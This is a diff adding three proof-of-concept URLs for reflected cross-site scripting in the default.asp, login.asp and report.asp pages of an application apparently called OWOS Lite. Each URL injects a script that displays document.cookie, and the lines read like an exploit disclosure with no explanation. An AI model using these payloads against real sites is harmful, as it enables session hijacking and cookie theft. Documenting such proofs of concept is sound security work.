@@ -1,0 +1,3 @@
+http://www.example.com/demo/owoslite/default.asp?show=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/demo/owoslite/login.asp?go=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/demo/owoslite/report.asp?show=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
